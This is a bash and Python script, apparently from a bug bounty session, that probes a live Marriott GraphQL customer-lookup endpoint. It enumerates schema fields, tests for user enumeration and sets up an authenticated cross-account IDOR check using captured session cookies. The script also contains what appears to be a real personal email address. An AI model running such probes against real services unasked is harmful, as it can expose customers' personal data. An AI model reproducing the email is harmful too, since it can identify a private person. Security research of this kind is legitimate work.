#!/usr/bin/env bash
# Session 24d — LookupCustomerProfiles IDOR test + response schema
# Goal: (1) enumerate LookupCustomerProfilesResponse fields with valid input
#       (2) authenticated test against own account to confirm data returned
#       (3) cross-account test to confirm IDOR (if response returns data)
#
# SAFETY: we only request our OWN account data in the authenticated self-test.
#         We do NOT store or exfiltrate any third-party member data.
#         Cross-account test uses a fabricated email only to confirm behavior.
#
# Date: 2026-06-25
# Input format confirmed S24c: { email: String!, firstName: String!, lastName: String! }

set -eo pipefail
mkdir -p /tmp/s24d

OP='phoenixAccountLookupCustomerProfiles'
EP="https://auth-apc.marriott.com/mi/query/${OP}"

# Own account data (from www.marriott.com session captured earlier)
OWN_EMAIL="zahinshahriar3@gmail.com"   # substitute your actual Bonvoy email
OWN_FNAME="True"                        # first name on Bonvoy account
OWN_LNAME="Tester"                      # last name on Bonvoy account

echo "========================================================"
echo "SESSION 24d — lookupCustomerProfiles IDOR test"
echo "========================================================"
echo ""
echo "Input format: { email: String!, firstName: String!, lastName: String! }"
echo "Own account email: $OWN_EMAIL"

# ---------------------------------------------------------------
# PHASE A: Response field enumeration with VALID input
#
# Now that we know the input structure, probe what fields
# LookupCustomerProfilesResponse has using a valid (but non-matching)
# email address — server will process the GraphQL validation and
# return field errors, not input validation errors.
# ---------------------------------------------------------------

echo ""
echo "======== PHASE A: LookupCustomerProfilesResponse field enumeration ========"
echo "(Using valid input format to get past input validation)"
echo ""

python3 << 'PYEOF'
import json, subprocess, re

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Valid input — any values OK for schema probing (not matching any real account)
# We use dummy values — just need to pass GraphQL input validation
INPUT_STR = '{email: "test@nowhere-invalid-domain.test", firstName: "Test", lastName: "User"}'

response_fields = [
    # Top-level response candidates
    "profiles", "customers", "results", "members", "hits", "matches",
    "items", "data", "total", "count", "totalCount",
    "pageInfo", "pagination",
    "customer", "profile", "found", "exists",
    "id", "customerId", "memberId", "loyaltyNumber",
    "emailAddress", "firstName", "lastName", "name",
    "status", "nextToken", "cursor",
]

exists = []
missing = []

print("Probing LookupCustomerProfilesResponse fields (valid input)...")
print("")

for field in response_fields:
    query_str = f"query {op}($dummy: String) {{ lookupCustomerProfiles(input: {INPUT_STR}) {{ {field} }} }}"
    payload = {"operationName": op, "variables": {"dummy": "x"}, "query": query_str}
    with open("/tmp/s24d/resp-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl","-s",ep,"-H","content-type: application/json",
         "-H","application-name: account","-d","@/tmp/s24d/resp-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout

    if f'Cannot query field "{field}"' in body:
        missing.append(field)
        status = "MISSING"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        exists.append(field)
        status = "EXISTS + upstream auth error (1012100)"
    elif "never used" in body and f'Cannot query field' not in body:
        exists.append(field)
        status = f"EXISTS (passed field check — validation: {body[:80]})"
    elif "FORBIDDEN" in body:
        status = "SAFELISTING BLOCKED"
    elif "required" in body.lower() and "not provided" in body:
        status = f"INPUT INCOMPLETE: {body[:100]}"
    else:
        exists.append(field)
        status = f"POSSIBLE EXISTS: {body[:100]}"
    print(f"  response.{field}: {status}")

print(f"\n=== LookupCustomerProfilesResponse EXISTS: {exists}")
print(f"=== MISSING: {missing}")
with open("/tmp/s24d/response-fields.json","w") as f:
    import json as j
    j.dump({"exists": exists, "missing": missing}, f, indent=2)
PYEOF

echo ""
echo "--- A2: Probe subfields of existing response types ---"
echo "(If 'profiles' exists, what fields does the profiles item have?)"

python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

INPUT_STR = '{email: "test@nowhere-invalid-domain.test", firstName: "Test", lastName: "User"}'

# Load which top-level fields exist
try:
    with open("/tmp/s24d/response-fields.json") as f:
        import json as j
        resp = j.load(f)
    top_exists = resp.get("exists", [])
except:
    # Fallback to likely candidates
    top_exists = ["profiles", "customers", "results", "members", "items", "data", "customer"]

print(f"Top-level fields to drill into: {top_exists}")
print("")

# Common subfields to probe for each top-level collection field
subfields = [
    "id", "customerId", "altCustId",
    "profile", "contactInformation", "loyaltyInformation",
    "loyaltyNumber", "memberId",
    "firstName", "lastName", "emailAddress", "email",
    "__typename",
]

for parent in top_exists[:5]:  # only drill into first 5 to stay focused
    print(f"\n--- Subfields of '{parent}' ---")
    for sub in subfields:
        query_str = f"query {op}($dummy: String) {{ lookupCustomerProfiles(input: {INPUT_STR}) {{ {parent} {{ {sub} }} }} }}"
        payload = {"operationName": op, "variables": {"dummy": "x"}, "query": query_str}
        with open("/tmp/s24d/sub-probe.json","w") as f:
            json.dump(payload, f)

        r = subprocess.run(
            ["curl","-s",ep,"-H","content-type: application/json",
             "-H","application-name: account","-d","@/tmp/s24d/sub-probe.json"],
            capture_output=True, text=True, timeout=15
        )
        body = r.stdout

        if f'Cannot query field "{sub}"' in body:
            status = "MISSING"
        elif "1012100" in body or "UNAUTHORIZED" in body:
            status = "EXISTS (1012100)"
        elif "is not an object" in body or "scalar" in body.lower():
            status = f"PARENT IS SCALAR (not object): {body[:80]}"
        elif "never used" in body:
            status = f"POSSIBLE: {body[:80]}"
        elif "FORBIDDEN" in body:
            status = "SAFELISTING BLOCKED"
        else:
            status = f"OTHER: {body[:80]}"
        print(f"  {parent}.{sub}: {status}")
PYEOF


# ---------------------------------------------------------------
# PHASE B: Unauthenticated lookup test — confirm resolver behavior
# Before using cookies, test what happens with no auth at all.
# ---------------------------------------------------------------

echo ""
echo "======== PHASE B: Unauthenticated behavior test ========"
echo ""

echo "--- B1: Unauthenticated lookup of own account email (no cookies) ---"
python3 << 'PYEOF'
import json, subprocess, os, sys

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

own_email = os.environ.get("OWN_EMAIL", "zahinshahriar3@gmail.com")
own_fname = os.environ.get("OWN_FNAME", "True")
own_lname = os.environ.get("OWN_LNAME", "Tester")

payload = {
    "operationName": op,
    "variables": {"dummy": "x"},
    "query": f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {{email: "{own_email}", firstName: "{own_fname}", lastName: "{own_lname}"}}) {{ __typename profiles {{ __typename id loyaltyNumber customerId profile {{ name {{ givenName familyName }} }} }} }} }}'
}
with open("/tmp/s24d/unauth-own.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24d/unauth-own.json",
    "-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)

print(f"Unauthenticated lookup of own email:")
print(r.stdout)

with open("/tmp/s24d/unauth-own-out.txt","w") as f:
    f.write(r.stdout)

if "1012100" in r.stdout:
    print("→ 1012100 = resolver reached upstream, needs auth")
elif "Cannot query field" in r.stdout:
    print("→ Response field name wrong — adjust in Phase C")
elif "FORBIDDEN" in r.stdout:
    print("→ Safelisting blocked (unexpected)")
elif '"data"' in r.stdout and "null" not in r.stdout[:100]:
    print("→ !! DATA RETURNED UNAUTHENTICATED — CRITICAL !!")
PYEOF

echo ""
echo "--- B2: Unauthenticated lookup of NON-EXISTENT email ---"
echo "(compare response size/content vs own email test)"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Probe with definitely non-existent email to see if we can enumerate existence
payload = {
    "operationName": op,
    "variables": {"dummy": "x"},
    "query": f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {{email: "nonexistent-xzy123@nowhere-invalid.test", firstName: "Zzzz", lastName: "Zzzz"}}) {{ __typename }} }}'
}
with open("/tmp/s24d/unauth-nonexistent.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24d/unauth-nonexistent.json",
    "-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)
print(f"Non-existent email response:")
print(r.stdout)
with open("/tmp/s24d/unauth-nonexistent-out.txt","w") as f:
    f.write(r.stdout)

print("")
print("KEY COMPARISON:")
print("Compare B1 vs B2 response size/content.")
print("If SAME size/content → no auth needed to confirm response is identical (no leak)")
print("If DIFFERENT → differential reveals member existence (user enumeration at minimum)")
PYEOF


# ---------------------------------------------------------------
# PHASE C: AUTHENTICATED lookup test
# Requires fresh cookies from www.marriott.com session.
# STEP 1: Capture cookies via browser on www.marriott.com
# STEP 2: Save to /tmp/s24d/cs.txt
# STEP 3: Run this block
# ---------------------------------------------------------------

echo ""
echo "======== PHASE C: Authenticated lookup test ========"
echo ""
echo "REQUIRES fresh cookies from www.marriott.com."
echo ""
echo "To capture: login to www.marriott.com in browser,"
echo "go to /loyalty/myAccount/default.mi, capture the curl"
echo "from Network tab as in previous sessions."
echo "Save cookie string (authState=...; BVB=...; etc.) to /tmp/s24d/cs.txt"
echo ""

if [ -f "/tmp/s24d/cs.txt" ]; then
    COOKIES=$(cat /tmp/s24d/cs.txt)
    echo "Cookie file found ($(wc -c < /tmp/s24d/cs.txt) chars). Running authenticated test."
    echo ""

    echo "--- C1: Authenticated lookup of OWN account ---"
    python3 << 'PYEOF'
import json, subprocess, os

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

own_email = os.environ.get("OWN_EMAIL", "zahinshahriar3@gmail.com")
own_fname = os.environ.get("OWN_FNAME", "True")
own_lname = os.environ.get("OWN_LNAME", "Tester")

cookies = open("/tmp/s24d/cs.txt").read().strip()

payload = {
    "operationName": op,
    "variables": {"dummy": "x"},
    "query": f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {{email: "{own_email}", firstName: "{own_fname}", lastName: "{own_lname}"}}) {{ __typename profiles {{ __typename id customerId loyaltyNumber profile {{ name {{ givenName familyName fullName }} }} contactInformation {{ emails {{ address }} }} loyaltyInformation {{ rewards {{ tier points }} }} }} }} }}'
}
with open("/tmp/s24d/auth-own.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-H",f"cookie: {cookies}",
    "-d","@/tmp/s24d/auth-own.json","-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)

print("C1 (own account, authenticated):")
print(r.stdout[:2000])
with open("/tmp/s24d/auth-own-out.txt","w") as f:
    f.write(r.stdout)

if "1012100" in r.stdout:
    print("\n→ Still 1012100 — cookie auth not accepted for this operation")
elif '"profiles"' in r.stdout and "null" not in r.stdout[:50]:
    print("\n→ !! DATA RETURNED — self-lookup WORKS with auth !!")
    print("→ NEXT: test with a DIFFERENT email to confirm cross-user IDOR")
elif "FORBIDDEN" in r.stdout:
    print("\n→ Safelisting blocked (unexpected)")
PYEOF

else
    echo "No cookie file at /tmp/s24d/cs.txt. Authenticated test SKIPPED."
    echo ""
    echo "To run the authenticated test, capture cookies from browser and save to /tmp/s24d/cs.txt"
    echo "Then re-run just Phase C:"
    echo ""
    echo "  python3 << 'PYEOF'"
    echo "  import json, subprocess"
    echo "  op = 'phoenixAccountLookupCustomerProfiles'"
    echo "  ep = f'https://auth-apc.marriott.com/mi/query/{op}'"
    echo "  cookies = open('/tmp/s24d/cs.txt').read().strip()"
    echo "  # substitute your Bonvoy email, first name, last name:"
    echo "  payload = {"
    echo '    "operationName": op,'
    echo '    "variables": {"dummy": "x"},'
    echo '    "query": f'"'"'query {op}($dummy: String) { lookupCustomerProfiles(input: {email: "YOUR_BONVOY_EMAIL", firstName: "YOUR_FIRST_NAME", lastName: "YOUR_LAST_NAME"}) { __typename profiles { __typename id customerId loyaltyNumber profile { name { givenName familyName } } } } }'"'"
    echo "  }"
    echo "  ..."
    echo "  PYEOF"
fi


echo ""
echo "======== SESSION 24d COMPLETE ========"
echo ""
echo "=== DECISION GUIDE ==="
echo ""
echo "Phase A — LookupCustomerProfilesResponse:"
echo "  If 'profiles' or 'customers' EXISTS → response is a list of member records"
echo "  If all MISSING → top-level field name wrong (try with auth or different fields)"
echo ""
echo "Phase B — Unauthenticated differential:"
echo "  If B1 (own email) != B2 (fake email) in size/content → user enumeration confirmed"
echo "  If both return identical 1012100 → lookup requires auth (no unauth enumeration)"
echo ""
echo "Phase C — Authenticated lookup:"
echo "  If C1 returns data → lookup confirmed working → run cross-user test"
echo "  Cross-user test: same query with a DIFFERENT email address"
echo "  If cross-user returns data → IDOR CONFIRMED → CRITICAL"
echo ""
echo "Expected IDOR impact if confirmed:"
echo "  Any Marriott Bonvoy member can look up ANY other member by email+name"
echo "  Data exposed: loyalty tier, points, member ID, profile data"
echo "  200M members affected"
echo "  CVSS: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 High"
echo "  Marriott bounty: High = USD 6,000-8,000"
